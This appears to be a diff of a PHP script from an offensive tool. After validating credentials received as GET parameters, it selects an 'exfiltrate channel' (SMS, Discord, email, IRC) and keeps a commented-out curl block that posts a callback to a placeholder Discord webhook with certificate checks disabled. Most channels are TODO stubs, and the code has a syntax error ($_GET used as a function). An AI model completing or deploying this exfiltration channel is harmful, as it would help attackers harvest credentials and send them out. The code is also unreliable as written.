@@ -16,22 +16,42 @@ if($_GET['user'] and $_GET['password']){
     }
     
     if($valid_creds){
-        // Need a discord server ...
-        
-        /*
-        $url = "https://discordapp.com/api/webhooks/xxxxxxxxx";
-        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
-        $POST = [ 'username' => 'whoishere', 'content' => 'Callback from XXX' ];
+    
+        // TODO: choose the exfiltrate channel : Discord, SMS, IRC, email, ...
+    
+        if(isset($_GET("chan")) && $_GET("chan")){
+            $chan = $_GET("chan");
+            switch($chan){
+                case 'SMS';
+                    // TODO send SMS
+                    break;
+                case 'DISC';
+                    // TODO send DISC
+                    // Need a discord server ...
+                    /*
+                    $url = "https://discordapp.com/api/webhooks/xxxxxxxxx";
+                    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
+                    $POST = [ 'username' => 'whoishere', 'content' => 'Callback from XXX' ];
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
-        $response   = curl_exec($ch);
-        */
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $url);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
+                    $response   = curl_exec($ch);
+                    */
+                    break;
+                case 'EMAIL';
+                    // TODO send EMAIL
+                    break;
+                case 'IRC';
+                    // TODO send IRC
+                    break;
+            }
+        }
+
     }
 }
 ?>
